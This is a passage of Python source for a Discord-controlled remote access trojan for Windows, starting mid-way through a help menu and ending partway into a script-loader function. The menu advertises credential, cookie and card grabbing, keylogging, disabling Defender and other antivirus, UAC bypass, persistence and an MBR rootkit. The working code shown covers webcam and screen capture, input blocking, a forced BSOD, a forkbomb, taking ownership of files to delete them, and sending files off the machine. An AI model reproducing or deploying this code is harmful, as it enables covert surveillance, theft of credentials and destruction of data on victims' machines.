`.update` — attach a new `.exe` to the message; it swaps the clone and relaunches.
"""),
    ("recon", "🕵️", "Recon & Inventory", """
`.sysinfo` — live CPU/RAM/disk.
`.systeminfo` — raw `systeminfo` dump as a file.
`.whoami` / `.env` / `.sessions` / `.users` — identity, environment, sessions, local accounts.
`.gpu` / `.cpu` / `.motherboard` / `.bios` / `.disks` / `.volumes` / `.partition` — hardware.
`.temp` / `.battery` / `.drives` / `.uptime` / `.sysclock` / `.boot-info`
`.hotfix` / `.antivirus` / `.drivers` / `.events` — patches, registered AV, drivers, system log.
`.installed` — installed applications from the registry.
`.wifi` — every saved profile with its key, exported then parsed.
"""),
    ("network", "📡", "Network", """
`.public-ip` / `.ip-locate` / `.coords` — public IP, geolocation, coordinates with a Maps link.
`.speedtest` — Ookla CLI, installed via winget if missing.
`.ping [host]` / `.tracert [host]` / `.nslookup <host>`
`.netstat` / `.ports` — all sockets, listening only.
`.arp` / `.route` / `.adapters` / `.nearby-wifi` / `.shares`
`.flushdns` / `.renewip` — flush cache, release + renew.
`.set-dns <d1> [d2]` — rewrite DNS on every up adapter.
`.website <url>` — open in the default browser.
"""),
    ("files", "📁", "Filesystem", """
`.ls` / `.cd <path>` / `.tree`
`.cat <file>` / `.tail <file> [n]`
`.grep <pattern> [path]` — file contents, skips AppData/node_modules/.git, stops at 4000 dirs.
`.search <pattern> [path]` — file names.
`.large-files [path]` / `.size <path>` / `.hash <file>`
`.mkdir` / `.mkfile <name> <text>` / `.touch` / `.remove` / `.move` / `.copy` / `.rename`
`.zip` / `.unzip` / `.download` / `.upload` / `.grab-url`
`.open` / `.run` / `.recent` / `.usb`
`.empty-temp` / `.clear-bin` / `.hosts`
`.mount <iso>` / `.unmount <iso|letter>`
`.cloak <path>` — hidden + system attributes.
`.lock-folder <path>` / `.unlock-folder <path>` — deny delete for Users.
"""),
    ("shell", "⌨️", "Remote Shell", """
`.cmd <command>` — through `cmd.exe`, UTF-8 forced, output capped at 1900 chars.
`.powershell <command>` — same via PowerShell, bypass policy.
`.scriptloader <url>` — download a `.ps1`/`.bat` and run it, output returned.
`.key <keys>` — type into whatever has focus.
`.msg <type> <title> <message>` — message box with the given button set.
`.win-notify "<title>" <message>` — toast notification.
"""),
    ("security", "🛡️", "Security & Policy", """
`.admin-check` / `.ask-admin` / `.uac-bypass` — report, request or attempt elevation.
`.disable-defender` / `.enable-defender` — real-time protection.
`.purge-av` — exclusions plus third-party AV services stopped and disabled at boot.
`.firewall <on|off>` — all profiles.
`.bitlocker` — volume and protection status.
`.defender-status` / `.firewall-rules` — posture readout.
`.hibernate <on|off>` / `.fastboot <on|off>`
`.blacklist <proc>` / `.unblacklist <proc>` — kill on sight, WMI process-start watcher.
`.block-domain <d>` / `.unblock-domain <d>` — hosts file.
`.block-website <url>` / `.unblock-website <url>`
`.disable-cmd` / `.enable-cmd` / `.disable-taskmgr` / `.enable-taskmgr`
`.disable-reagentc` / `.enable-reagentc` / `.deactivate-windows`
"""),
    ("persist", "🔗", "Persistence & Rootkit", """
`.wdiag` — slots, userinit, tasks and watchdog state.
`.repair` — re-copy slots, re-add userinit and tasks, re-add exclusions.
`.implode` — remove every trace and exit.
`.vmdiag` — VM guard verdict with the hits that decided it.
`.crashlog` / `.crashclear` — fetch or wipe the crash log.

**Rootkit** (manual, never auto-installs):
`.rootkit status` — MBR state, stub verification, disk, slot, backup.
`.rootkit mbr` — backup, write original to LBA1, verify, write stub to LBA0, verify, auto-rollback on mismatch.
`.rootkit unmbr` — restore, sha-checked against the journal.
`.rootkit slot` / `.rootkit recover` — raw payload copy near the end of the disk, sha-verified, relaunch.
`.rootkit esp` / `.rootkit esp-clean` — stash on the EFI partition.
`.rootkit install` — mbr + slot + esp.
`.rootkit clean` — unmbr + esp-clean + delete backups.

On GPT the MBR is protective: the stub only runs under CSM. The ESP copy survives a C: format but is a stash, not an autostart.
"""),
    ("troll", "🎭", "Trolling", """
`.fake-bsod` / `.fake-lock` / `.fake-update` — fullscreen fakes, 10-12 s.
`.black-screen [s]` — black overlay, max 600 s.
`.display-glitch [effect]` — 41 GDI effects, `.display-glitch list` to enumerate.
`.caps-roulette [s]` / `.volume-roulette [s]` — random lock state, random volume.
`.numlock-spam [n]` / `.window-shake [n]` / `.taskbar-dance [n]`
`.desktop-mess [n]` — junk `.txt` files on the desktop.
`.error-storm [n]` — stacked error dialogs.
`.rickroll` / `.crazy-mouse` / `.minimize-all` / `.bsod` / `.forkbomb`
"""),
("troll2", "🎪", "Troll extras", """
`.scream` / `.beep-song` / `.volume-rave [s]` — noise and volume.
`.fake-cmd` / `.fake-error-loop` / `.error-storm [n]` — fake consoles and errors.
`.fake-login [s]` / `.fake-scan` / `.fake-printer` / `.fake-disk-full` / `.fake-wifi-drop`
`.shutdown-countdown [s]` / `.fake-update [%]` — fake shutdown and update screens.
`.mouse-teleport` / `.cursor-spin [r]` / `.caps-spam [n]`
`.typing-ghost [text]` — types into the focused window.
`.folder-storm [n]` / `.window-stack [n]` / `.random-notify [n]`
`.taskbar-move <top|bottom|left|right>` / `.rename-user <name>`
"""),
    ("win2", "🧰", "Windows extras", """
`.sys-summary` / `.cpu-load` / `.mem-top [n]` / `.disk-health` — health and load.
`.boot-errors` / `.bsod-history` / `.net-quality` — real diagnostics.
`.time-sync` / `.dns-cache` / `.winsock-reset` / `.powercfg-report` / `.battery-report`
`.wlan-report` / `.net-pid` / `.listening-owner` / `.fw-status`
`.defender-exclusions` / `.defender-scan [path]`
`.sched-list [path]` / `.sched-add <name> <time> <cmd>` / `.sched-del <name>`
`.svc-status <name>` / `.svc-start|svc-stop|svc-restart <name>`
`.env-path` / `.path-add <dir>` / `.hostname-set <name>` / `.proxy-off`
`.dpi-info` / `.font-list` / `.audio-devices` / `.codec-list`
"""),
    ("web", "🌐", "Web panel", """
`.panel` — starts the panel and returns the tokenised URL.
`.panel lan` — exposes it on the LAN (`0.0.0.0` bind), useful behind CGNAT on a local network.
`.panel tunnel` — opens an outbound cloudflared tunnel, **works behind CGNAT or a foreign IP**.
`.panel url` — prints the URL again.
`.panel stop` — shuts it down.

The token is 18 random bytes, rotated on every start, carried in an `HttpOnly` + `SameSite=Strict` cookie, with a strict CSP and a single concurrent command capped at 45 s.
"""),
    ("keys", "🎹", "Keylogger & Clipboard", """
`.keylogger-enable` / `.keylogger-disable` — global listener on/off.
`.keylog` — flush the buffer to #keys now; otherwise it flushes every 60 s.
`.clipboard` — read the clipboard.
`.set-clipboard <text>` — overwrite it.
`.clipwatch <on|off>` — mirror clipboard changes into #keys.
"""),
    ("discord", "🤖", "Bot Control", """
`.say <text>` / `.purge [n]` / `.nick <name>` / `.avatar <url>`
`.status <playing|watching|listening|competing> <text>`
`.embed <title> | <description>`
`.accent <name|#hex>` — embed colour, persisted per guild.
`.guilds` / `.pingbot` / `.leave-all` / `.clear`
"""),
    ("grab", "💰", "Grabber", """
`.grab all` — cookies, history, cards, games and Discord accounts, split by type.
`.grab cookies` / `.grab history` / `.grab cards`
`.grab games` / `.grab passwords` / `.grab discord`
`.grab vm` — sandbox report.
`.discord-diag` — Discord installs, levels and token extraction.
`.grabber [url] [mode]` — fetch, exclude, run, post output, delete.
"""),
    ("misc", "🧰", "Misc Tools", """
`.notepad [text]` — open it, optionally pre-filled.
`.godmode` — GodMode folder on the desktop.
`.restore-point` — System Restore checkpoint.
`.eject` — eject the optical drive.
`.run-add <name> <path>` / `.run-del <name>` — HKCU Run key.
`.set-date <date>` / `.set-time <time>` — system clock.
`.boot-info` / `.perf` / `.pstree` / `.fgwin`
"""),
]


class HelpView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=300)
        options = [discord.SelectOption(label=name, value=key, emoji=emoji) for key, emoji, name, _ in HELP_PAGES]
        select = discord.ui.Select(placeholder="Pick a category...", options=options, row=0)
        select.callback = self.on_select
        self.select = select
        self.add_item(select)

    def build_embed(self, key):
        for k, emoji, name, body in HELP_PAGES:
            if k == key:
                return create_embed(f"{emoji} {name}", body, 0x9B59B6)
        return create_embed("Help", "Pick a category from the menu below.", 0x9B59B6)

    async def on_select(self, interaction: discord.Interaction):
        await interaction.response.edit_message(embed=self.build_embed(self.select.values[0]), view=self)


@bot.command()
async def help(ctx):
    view = HelpView()
    await ctx.send(embed=view.build_embed("overview"), view=view)

@bot.command()
async def volume(ctx, vol: int = None):
    if vol is None:
        await ctx.send(embed=create_embed("Error", "You have to provide a volume between 0 and 100, for example `.volume 40`.", 0xff0000))
        return
    if set_volume_level(vol / 100):
        await ctx.send(embed=create_embed("🔊 Volume", f"The system volume was set to **{vol}%** and the change was applied immediately.", 0x00ff00))
    else:
        await ctx.send(embed=create_embed("Error", "The volume could not be changed, the audio endpoint did not accept the request.", 0xff0000))


@bot.command()
async def ss(ctx):
    await ctx.message.add_reaction("📌")
    path = screenshot_all()
    if path:
        file_name = os.path.basename(path)
        embed = create_embed("📸 Screenshot taken", "A screenshot of every connected display was taken and is attached to this message.", 0x0084FF)
        embed.set_image(url=f"attachment://{file_name}")
        await ctx.send(embed=embed, file=discord.File(path, filename=file_name))
        os.remove(path)


@bot.command()
async def screenrec(ctx, seconds: int = 30):
    if seconds > 300:
        seconds = 300
    await ctx.message.add_reaction("📌")
    await ctx.send(f"`🎥` A screen recording of **{seconds}** seconds was started, it will be uploaded as soon as it finishes.")
    try:
        import imageio
        frames = []
        start = time.time()
        while time.time() - start < seconds:
            frames.append(np.array(pyautogui.screenshot()))
        output_file = os.path.join(BASE_DIR, "recording.mp4")
        imageio.mimsave(output_file, frames, fps=10)
        await ctx.send(embed=create_embed("🎥 Screen recording", "The recording finished correctly and the video file is attached below.", 0x0084ff),
                       file=discord.File(output_file))
        os.remove(output_file)
    except Exception as e:
        await ctx.send(f"The recording could not be completed: {e}")


@bot.command(aliases=["list-cams"])
async def list_cams(ctx):
    cams = list_cameras()
    msg = "\n".join([f"Camera **ID {i}**" for i in cams])
    await ctx.send(embed=create_embed("Cameras", msg or "No capture device was detected on this machine.", 0x3498db))


@bot.command()
async def webcam(ctx):
    cap = cv2.VideoCapture(selected_camera)
    if cap.isOpened():
        ret, frame = cap.read()
        if ret:
            path = os.path.join(BASE_DIR, "webcam.png")
            cv2.imwrite(path, frame)
            embed = create_embed("📹 Webcam photo", f"A photo was taken with camera **{selected_camera}** and is attached to this message.", 0x0084FF)
            embed.set_image(url="attachment://webcam.png")
            await ctx.send(embed=embed, file=discord.File(path, filename="webcam.png"))
            os.remove(path)
        cap.release()
    else:
        await ctx.send(embed=create_embed("Error", f"Camera **{selected_camera}** could not be opened, it may be busy or disconnected.", 0xFF0000))


@bot.command(aliases=["sel-cam"])
async def sel_cam(ctx, num: int = None):
    global selected_camera
    if num is None:
        await ctx.send(embed=create_embed("Error", "You have to indicate the camera index, for example `.sel-cam 0`.", 0xff0000))
        return
    selected_camera = num
    await ctx.send(embed=create_embed("📹 Camera", f"Camera **{num}** is now the one used by the webcam commands.", 0x00ff00))


@bot.command(aliases=["list-mics", "microphones"])
async def list_microphones(ctx):
    await ctx.message.add_reaction("🎙️")
    try:
        mics = get_input_devices()
        lines = [f"{i}. {m['name']}" for i, m in enumerate(mics)]
        await ctx.send(embed=create_embed("🎙️ Microphones", f"The following input devices were found:\n```{chr(10).join(lines) or 'None'}```", 0x0084ff))
    except Exception as e:
        await ctx.send(embed=create_embed("Error", f"The input devices could not be listed: {e}", 0xff0000))


@bot.command(aliases=["sel-mic", "selmic"])
async def sel_mic(ctx, num: int = None):
    global selected_mic
    mics = get_input_devices()
    if num is None or not (0 <= num < len(mics)):
        lines = [f"{i}. {m['name']}" for i, m in enumerate(mics)]
        await ctx.send(embed=create_embed("🎙️ Microphones", f"Pick one of the devices below by its position:\n```{chr(10).join(lines) or 'None'}```", 0x0084ff))
        return
    selected_mic = mics[num]["index"]
    await ctx.send(embed=create_embed("🎙️ Microphone", f"`{mics[num]['name']}` is now the input used by the recording commands.", 0x00ff00))


@bot.command(aliases=["list-speakers"])
async def list_speakers(ctx):
    await ctx.message.add_reaction("🔊")
    ps_script = "Get-AudioDevice -List | Where-Object { $_.Type -eq 'Playback' } | Select-Object Index, Name, Default | ConvertTo-Json -Compress"
    try:
        result = ps(ps_script)
        devices = json.loads(result.stdout.strip())
        if isinstance(devices, dict):
            devices = [devices]
        lines = [f"{d['Index']}. {'[DEFAULT] ' if d.get('Default') else ''}{d['Name']}" for d in devices]
        embed = create_embed("🔊 Speakers", f"These playback devices are available, the default one is marked:\n```{chr(10).join(lines)}```", 0x0084ff)
    except Exception as e:
        embed = create_embed("Error", f"The playback devices could not be listed: {e}", 0xff0000)
    await ctx.send(embed=embed)


@bot.command(aliases=["change-output", "set-speaker"])
async def change_output(ctx, target: str = None):
    if not target:
        await ctx.send(embed=create_embed("Error", "You have to give an index or a name, for example `.set-speaker 2`.", 0xffa500))
        return
    ps_script = f'''
if (-not (Get-Module -ListAvailable AudioDeviceCmdlets)) {{
    Install-Module -Name AudioDeviceCmdlets -Scope CurrentUser -Force -AllowClobber | Out-Null
}}
if ('{target}' -as [int]) {{
    Set-AudioDevice -Index {target}
}} else {{
    $dev = Get-AudioDevice -List | Where-Object {{ $_.Type -eq 'Playback' -and $_.Name -like '*{target}*' }} | Select-Object -First 1
    if ($dev) {{ Set-AudioDevice -Index $dev.Index }} else {{ Write-Output "NOT_FOUND" }}
}}
'''
    result = ps(ps_script)
    if "NOT_FOUND" in result.stdout:
        await ctx.send(embed=create_embed("Error", f"No playback device matches **{target}**.", 0xff0000))
    else:
        await ctx.send(embed=create_embed("🔊 Output", f"`{target}` is now the default playback device for the whole system.", 0x0084ff))


@bot.command(aliases=["block-input"])
async def block_input(ctx, seconds: int = None):
    global input_blocked, keyboard_listener, mouse_listener
    if input_blocked:
        await ctx.send("The input is already blocked, use `.unblock-input` to release it.")
        return
    await ctx.message.add_reaction("📌")
    if seconds is None:
        keyboard_listener = keyboard.Listener(suppress=True)
        mouse_listener = mouse.Listener(suppress=True)
        keyboard_listener.start()
        mouse_listener.start()
        input_blocked = True
        await ctx.send(embed=create_embed("⌨️ Input blocked", "The keyboard and the mouse are frozen and will stay like this until the input is released.", 0xff0000))
    else:
        def block_temp():
            global input_blocked
            k = keyboard.Listener(suppress=True)
            m = mouse.Listener(suppress=True)
            k.start()
            m.start()
            time.sleep(seconds)
            k.stop()
            m.stop()
            input_blocked = False
        input_blocked = True
        threading.Thread(target=block_temp, daemon=True).start()
        await ctx.send(embed=create_embed("⌨️ Input blocked", f"The keyboard and the mouse are frozen for the next **{seconds}** seconds.", 0xff0000))


@bot.command(aliases=["unblock-input"])
async def unblock_input(ctx):
    global input_blocked, keyboard_listener, mouse_listener
    if not input_blocked:
        await ctx.send("`🚫` The input was not blocked, so there is nothing to release.")
        return
    if keyboard_listener:
        keyboard_listener.stop()
    if mouse_listener:
        mouse_listener.stop()
    input_blocked = False
    await ctx.send(embed=create_embed("⌨️ Input Unblocked", "The keyboard and the mouse respond again.", 0x00ff00))


@bot.command(aliases=["hide-cursor"])
async def hide_cursor(ctx):
    ctypes.windll.user32.ShowCursor(False)
    await ctx.send(embed=create_embed("🖱️ Cursor", "The mouse pointer was hidden from the screen.", 0x00ff00))


@bot.command(aliases=["show-cursor"])
async def show_cursor(ctx):
    ctypes.windll.user32.ShowCursor(True)
    await ctx.send(embed=create_embed("🖱️ Cursor", "The mouse pointer is visible again.", 0x00ff00))


@bot.command(aliases=["monitors-off"])
async def monitors_off(ctx):
    ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, 2)
    await ctx.send(embed=create_embed("💻 Monitors", "The displays were powered down, they can be woken with `.monitors-on`.", 0xff0000))


@bot.command(aliases=["monitors-on"])
async def monitors_on(ctx):
    ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, -1)
    await ctx.send(embed=create_embed("💻 Monitors", "The displays were powered back up.", 0x00ff00))


@bot.command()
async def taskkill(ctx, *, process: str):
    subprocess.run(["taskkill", "/f", "/im", process], capture_output=True)
    await ctx.send(embed=create_embed("🚫 Taskkill", f"Every instance of **{process}** was terminated by force.", 0x27F542))


@bot.command()
async def tasklist(ctx):
    result = cmd_run("tasklist")
    for chunk in chunk_text(result.stdout):
        await ctx.send(f"```{chunk}```")


@bot.command(aliases=["kill-explorer"])
async def kill_explorer(ctx):
    subprocess.run(["taskkill", "/f", "/im", "explorer.exe"], capture_output=True)
    await ctx.send(embed=create_embed("⛔ Explorer", "Explorer was terminated, the desktop and the taskbar are gone until it is started again.", 0xff0000))


@bot.command(aliases=["start-explorer"])
async def start_explorer(ctx):
    subprocess.Popen(["start", "explorer.exe"], shell=True)
    await ctx.send(embed=create_embed("⛔ Explorer", "Explorer was started again and the desktop is back.", 0x00ff00))


@bot.command(aliases=["set-critical"])
async def set_critical(ctx):
    ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0)
    await ctx.send(embed=create_embed("❗ Critical", "The process is now critical, terminating it will bug check the whole machine.", 0xff0000))


@bot.command(aliases=["unset-critical"])
async def unset_critical(ctx):
    ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0)
    await ctx.send(embed=create_embed("❗ Critical", "The critical flag was removed and the process can be killed safely again.", 0x00ff00))


@bot.command(aliases=["crazy-mouse"])
async def crazy_mouse(ctx):
    await ctx.message.add_reaction("🖱️")
    def crazy():
        for _ in range(200):
            ctypes.windll.user32.SetCursorPos(random.randint(0, 1920), random.randint(0, 1080))
            time.sleep(0.01)
    threading.Thread(target=crazy, daemon=True).start()
    await ctx.send(embed=create_embed("😵‍💫 Crazy Mouse", "The pointer jumps to a random position on the screen for two seconds.", 0xf39c12))


@bot.command(aliases=["minimize-all"])
async def minimize_all(ctx):
    subprocess.run(["powershell", "-Command", "$w = New-Object -ComObject Shell.Application; $w.MinimizeAll()"], capture_output=True)
    await ctx.send(embed=create_embed("➖ Minimize", "Every open window was minimized to the taskbar at once.", 0x00ff00))


@bot.command()
async def bsod(ctx):
    await ctx.send(embed=create_embed("💀 BSOD", "A real bug check is being triggered, the machine is about to restart.", 0x00ff00))
    await ctx.message.add_reaction("💀")
    try:
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_int()))
        ctypes.windll.ntdll.NtRaiseHardError(0xC000007B, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
        subprocess.run(["taskkill", "/F", "/IM", "svchost.exe"])
    except Exception:
        pass


@bot.command()
async def forkbomb(ctx):
    await ctx.message.add_reaction("💀")
    await ctx.send(embed=create_embed("🍽️ Forkbomb", "A forkbomb was started, new processes will keep spawning until the machine gives up.", 0xff0000))
    while True:
        subprocess.Popen([sys.executable, sys.argv[0]], creationflags=subprocess.CREATE_NEW_CONSOLE)


JUMPSCARE_URL = "https://github.com/MateAGYT/LessMi/raw/main/resources/jump.mp4"
JUMP_MIN = 100_000


def _jump_ready(path):
    try:
        return os.path.exists(path) and os.path.getsize(path) > JUMP_MIN
    except Exception:
        return False


async def _ensure_jump():
    for p in (resource_path("jump.mp4"), os.path.join(BASE_DIR, "jump.mp4")):
        if _jump_ready(p):
            return p
    os.makedirs(BASE_DIR, exist_ok=True)
    dest = os.path.join(BASE_DIR, "jump.mp4")
    tmp = dest + ".part"
    async with aiohttp.ClientSession() as s:
        async with s.get(JUMPSCARE_URL, allow_redirects=True,
                         timeout=aiohttp.ClientTimeout(total=60)) as r:
            if r.status != 200:
                raise OSError(f"HTTP {r.status}")
            data = await r.read()
    if len(data) < JUMP_MIN or b"ftyp" not in data[:64]:
        raise OSError("bad payload (LFS pointer or error HTML)")
    with builtins.open(tmp, "wb") as f:
        f.write(data)
    os.replace(tmp, dest)
    return dest


def _jump_audio(path):
    wav = os.path.join(BASE_DIR, "jump.wav")
    try:
        if os.path.exists(wav) and os.path.getsize(wav) > 4096:
            return wav
        subprocess.run(
            [FFMPEG_BIN, "-y", "-loglevel", "error", "-i", path, "-vn",
             "-acodec", "pcm_s16le", "-ar", "44100", "-ac", "2", wav],
            capture_output=True, creationflags=_CNW, timeout=90)
        if os.path.exists(wav) and os.path.getsize(wav) > 4096:
            return wav
    except Exception:
        pass
    return None


def _play_jump(path):
    wav = _jump_audio(path)
    if wav:
        try:
            winsound.PlaySound(wav, winsound.SND_FILENAME | winsound.SND_ASYNC)
        except Exception:
            pass

    cap = None
    try:
        cap = cv2.VideoCapture(path)
        if not cap.isOpened():
            raise OSError("no decoder")

        fps = cap.get(cv2.CAP_PROP_FPS)
        delay = max(1, int(1000.0 / (fps if fps and fps > 1 else 30.0)))

        cv2.namedWindow("jump", cv2.WINDOW_NORMAL)
        cv2.setWindowProperty("jump", cv2.WND_PROP_FULLSCREEN, cv2.WINDOW_FULLSCREEN)
        try:
            cv2.setWindowProperty("jump", cv2.WND_PROP_TOPMOST, 1)
            cv2.setWindowProperty("jump", cv2.WND_PROP_ASPECT_RATIO, cv2.WINDOW_KEEPRATIO)
        except Exception:
            pass

        first = True
        while True:
            ok, frame = cap.read()
            if not ok:
                break
            if first:
                first = False
                h, w = frame.shape[:2]
                cv2.resizeWindow("jump", w, h)
            cv2.imshow("jump", frame)
            cv2.waitKey(delay)

        cap.release()
        cap = None
        cv2.waitKey(120)
        cv2.destroyWindow("jump")
        cv2.waitKey(120)
        return "cv2"
    except Exception:
        return None
    finally:
        if cap is not None:
            try:
                cap.release()
            except Exception:
                pass
        try:
            winsound.PlaySound(None, winsound.SND_PURGE)
        except Exception:
            pass

@bot.command(aliases=["display-glitch"])
async def display_glitch(ctx, effect: str = None):
    if effect is None or effect == "list":
        await ctx.send(embed=create_embed("💻 Available Glitches", "These are all the effects the display can run right now:\n" + "".join(flash_screen("list")), 0x3498db))
        return
    if effect + "\n" in flash_screen("list"):
        threading.Thread(target=flash_screen, args=(effect,), daemon=True).start()
        await ctx.send(embed=create_embed("💻 Glitch Executed", f"The **{effect}** effect is now running over the whole desktop.", 0x00ff00))
    else:
        await ctx.send(embed=create_embed("Error", "That effect does not exist, run `.display-glitch list` to see the valid ones.", 0xff0000))


@bot.command(aliases=["windows-notification", "win-notify"])
async def windows_notification(ctx, title: str = None, *, message: str = None):
    if not title or not message:
        await ctx.send(embed=create_embed("Error", 'You have to give a title and a message, for example `.win-notify "Update" "Restart needed"`.', 0xffa500))
        return
    ps_script = (
        '[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms"); '
        '$notify = New-Object System.Windows.Forms.NotifyIcon; '
        '$notify.Icon = [System.Drawing.SystemIcons]::Information; '
        '$notify.Visible = $true; '
        f'$notify.ShowBalloonTip(5000, "{title}", "{message}", [System.Windows.Forms.ToolTipIcon]::Info); '
        'Start-Sleep -s 6; $notify.Dispose()'
    )
    ps(ps_script)
    await ctx.send(embed=create_embed("🔔 Notification", f"A system balloon with the title **{title}** and the text below was shown.\n{message}", 0x0084ff))


@bot.command()
async def play(ctx, *, file: str):
    subprocess.Popen(["start", file], shell=True)
    await ctx.send(embed=create_embed("🎵 Playing", f"The file `{file}` was handed to the default media player.", 0x00ff00))


@bot.command(aliases=["speak"])
async def tts(ctx, *, message: str):
    def say():
        try:
            import pythoncom
            pythoncom.CoInitialize()
            win32com.client.Dispatch("SAPI.SpVoice").Speak(message, 0)
            pythoncom.CoUninitialize()
        except Exception:
            subprocess.run(["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command",
                            "Add-Type -AssemblyName System.Speech; "
                            "(New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak($env:ZZTTS)"],
                           capture_output=True, creationflags=_CNW,
                           env=dict(os.environ, ZZTTS=message))
    await asyncio.to_thread(say)
    await ctx.send(embed=create_embed("🗣️ TTS", f"The following text was read out loud through the speakers:\n```{message[:300]}```", 0x00ff00))


@bot.command()
async def msg(ctx, type: int = None, title: str = None, *, message: str = None):
    if type is None or title is None or message is None:
        await ctx.send(embed=create_embed("💬 MsgBox", 'You have to give a type, a title and a message, for example `.msg 64 "Hello" "Text"`.', 0x00ff00))
        return
    safe_title = title.replace('"', '`"')
    safe_message = message.replace('"', '`"')
    subprocess.run(["powershell", "-Command",
                    f'Add-Type -AssemblyName Microsoft.VisualBasic; '
                    f'[Microsoft.VisualBasic.Interaction]::MsgBox("{safe_message}", "{type}", "{safe_title}")'],
                   capture_output=True, creationflags=_CNW)
    await ctx.send(embed=create_embed("💬 Message", f"A message box titled **{title}** was opened with the text below.\n{message}", 0x00ff00))


@bot.command(aliases=["ls"])
async def dir(ctx):
    global current_dir
    try:
        files = os.listdir(current_dir)
        out = f"👤 **{current_dir}**\n\n"
        for f in files:
            full = os.path.join(current_dir, f)
            if os.path.isdir(full):
                out += f"`📂` `{f}/`\n"
            else:
                out += f"`📄` `{f}` ({os.path.getsize(full)} bytes)\n"
        await ctx.send(embed=create_embed("📁 Directory", f"The contents of the current folder were listed below.\n{out[:3900]}", 0x3498db))
    except Exception as e:
        await ctx.send(f"The folder could not be listed: {e}")


@bot.command()
async def cd(ctx, path: str):
    global current_dir
    try:
        if path == "..":
            current_dir = os.path.dirname(current_dir)
        elif os.path.isabs(path):
            current_dir = path
        else:
            current_dir = os.path.join(current_dir, path)
        current_dir = os.path.normpath(current_dir)
        await ctx.send(embed=create_embed("📁 Directory", f"The working folder is now `{current_dir}`.", 0x00ff00))
    except Exception as e:
        await ctx.send(f"The folder could not be changed: {e}")


@bot.command()
async def tree(ctx):
    global current_dir
    try:
        lines = tree_directory(current_dir)[:300]
        chunks, cur = [], ""
        for line in lines:
            if len(cur) + len(line) + 1 > 3900:
                chunks.append(cur)
                cur = ""
            cur += line + "\n"
        if cur:
            chunks.append(cur)
        for i, chunk in enumerate(chunks):
            await ctx.send(embed=create_embed(f"🌳 Tree {'(Part ' + str(i + 1) + ')' if len(chunks) > 1 else ''}", f"The folder tree was generated and is shown below.\n```{chunk}```", 0x3498db))
    except Exception as e:
        await ctx.send(f"The tree could not be generated: {e}")


@bot.command()
async def download(ctx, file: str):
    global current_dir
    path = os.path.join(current_dir, file) if not os.path.isabs(file) else file
    if not os.path.exists(path):
        await ctx.send(embed=create_embed("Error", "That file does not exist in the current folder.", 0xff0000))
        return
    if os.path.getsize(path) < 20 * 1024 * 1024:
        await ctx.send(embed=create_embed("🔽 File", f"The file `{file}` is attached to this message.", 0x00ff00), file=discord.File(path))
    else:
        link = upload_fileio(path)
        await ctx.send(embed=create_embed("📎 Link", link or "The file was too large and the external upload failed.", 0x00ff00))


@bot.command()
async def upload(ctx):
    global current_dir
    if not ctx.message.attachments:
        await ctx.send("You have to attach a file to the same message as the command.")
        return
    for attachment in ctx.message.attachments:
        await attachment.save(os.path.join(current_dir, attachment.filename))
        await ctx.send(embed=create_embed("⬆️ Uploaded", f"`{attachment.filename}` was stored in `{current_dir}`.", 0x00ff00))


@bot.command()
async def remove(ctx, *, file: str):
    global current_dir
    path = os.path.join(current_dir, file) if not os.path.isabs(file) else file
    try:
        if os.path.isdir(path):
            shutil.rmtree(path)
        else:
            os.remove(path)
        await ctx.send(embed=create_embed("🗑️ Deleted", f"`{file}` was removed from the disk.", 0x00ff00))
    except PermissionError:
        subprocess.run(["takeown", "/f", path, "/r"], capture_output=True)
        subprocess.run(["icacls", path, "/grant", "everyone:F", "/t"], capture_output=True)
        try:
            shutil.rmtree(path) if os.path.isdir(path) else os.remove(path)
            await ctx.send(embed=create_embed("🗑️ Deleted", f"`{file}` was locked, so the permissions were taken over first and then it was removed.", 0x00ff00))
        except Exception as e:
            await ctx.send(embed=create_embed("Error", f"The permissions were taken over but the delete still failed: {e}", 0xff0000))
    except Exception as e:
        await ctx.send(embed=create_embed("Error", f"The path could not be removed: {e}", 0xff0000))


@bot.command(name="open")
async def open_path(ctx, *, file: str):
    global current_dir
    path = os.path.join(current_dir, file) if not os.path.isabs(file) else file
    subprocess.Popen(["start", "", path], shell=True)
    await ctx.send(embed=create_embed("📬 Opened", f"`{file}` was opened with its default application.", 0x00ff00))


@bot.command(aliases=["clear-bin"])
async def empty_bin(ctx):
    ps("Clear-RecycleBin -Force -ErrorAction SilentlyContinue")
    await ctx.send(embed=create_embed("🗑️ Recycle Bin", "The recycle bin was emptied on every drive.", 0x0084ff))


@bot.command(aliases=["set-wallpaper", "wallpaper"])
async def set_wallpaper(ctx, *, source: str = None):
    global current_dir
    if not source:
        await ctx.send(embed=create_embed("Error", "You have to give a local file or a direct URL to the image.", 0xffa500))
        return
    if source.startswith("http"):
        target_path = os.path.join(os.environ.get("TEMP", "C:\\Windows\\Temp"), "wallpaper_temp.jpg")
        async with aiohttp.ClientSession() as session:
            async with session.get(source) as resp:
                with builtins.open(target_path, "wb") as f:
                    f.write(await resp.read())
    else:
        target_path = os.path.abspath(os.path.join(current_dir, source) if not os.path.isabs(source) else source)
    cmd = (f'Add-Type -TypeDefinition \'using System; using System.Runtime.InteropServices; public class W '
           f'{{ [DllImport("user32.dll", CharSet=CharSet.Auto)] public static extern int SystemParametersInfo(int a, int u, string p, int f); }}\'; '
           f'[W]::SystemParametersInfo(20, 0, \'{target_path}\', 3)')
    ps(cmd)
    await ctx.send(embed=create_embed("🖼️ Wallpaper", "The desktop wallpaper was replaced with the supplied image.", 0x0084ff))


@bot.command(aliases=["scriptloader"])
async def script_loader(ctx, url: str = None):
    if not url:
        await ctx.send(embed=create_embed("Error", "You have to give a direct URL to a `.ps1` or a `.bat` file.", 0xffa500))
        return
    ext = ".ps1" if url.lower().endswith(".ps1") else ".bat" if url.lower().endswith(".bat") else None
    if not ext:
        await ctx.send(embed=create_embed("Error", "The URL has to end in `.bat` or `.ps1`.", 0xff0000))
        return
    path = os.path.join(os.environ.get("TEMP", "C:\\Windows\\Temp"), f"loaded_script{ext}")
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as resp:
